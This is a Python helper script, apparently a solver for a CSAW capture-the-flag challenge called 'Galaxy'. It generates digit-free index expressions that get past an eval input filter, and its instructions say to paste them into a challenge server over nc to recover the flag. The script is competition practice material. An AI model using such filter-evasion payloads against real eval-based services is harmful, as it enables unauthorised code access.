#!/usr/bin/env python3
"""
Galaxy CTF - Quick Manual Solver

Use this if you want to manually send payloads or test specific indices.
"""

def build_payload(negative_index):
    """
    Build a payload to access spiral[negative_index]
    
    Examples:
        build_payload(-1)  => "spiral[~(()>())]"
        build_payload(-2)  => "spiral[~(('a'<'b'))]"
        build_payload(-3)  => "spiral[~(('a'<'b')+('a'<'b'))]"
    """
    if negative_index >= 0:
        raise ValueError("Index must be negative")
    
    # ~n = -(n+1), so to get negative_index = -(n+1), we need n = -negative_index - 1
    n = -negative_index - 1
    
    if n == 0:
        expr = "()>()"
    else:
        parts = ["('a'<'b')"] * n
        expr = "+".join(parts)
    
    return f"spiral[~({expr})]"

if __name__ == "__main__":
    print("Galaxy CTF - Payload Builder")
    print("="*60)
    print("\nGenerate payloads for manual use:\n")
    
    print("First 10 characters (from the end):")
    for i in range(1, 11):
        payload = build_payload(-i)
        print(f"  Index -{i:2}: {payload}")
    
    print("\n" + "="*60)
    print("\nTo use these payloads:")
    print("1. Connect to the server: nc msc.chal.csaw.io 21009")
    print("2. Paste each payload one at a time")
    print("3. Collect the characters")
    print("4. Reverse the string to get the flag")
    print("\nNote: The server uses a substitution cipher, so it will")
    print("automatically decrypt your input before evaluation.")
    
    print("\n" + "="*60)
    print("\nInteractive mode:")
    print("Enter a negative index (e.g., -1, -2, -3) or 'q' to quit")
    
    while True:
        try:
            user_input = input("\nIndex: ").strip()
            if user_input.lower() == 'q':
                break
            
            idx = int(user_input)
            if idx >= 0:
                print("  Error: Index must be negative!")
                continue
            
            payload = build_payload(idx)
            print(f"  Payload: {payload}")
            
        except ValueError:
            print("  Error: Please enter a valid negative integer")
        except KeyboardInterrupt:
            break
    
    print("\nGoodbye!")
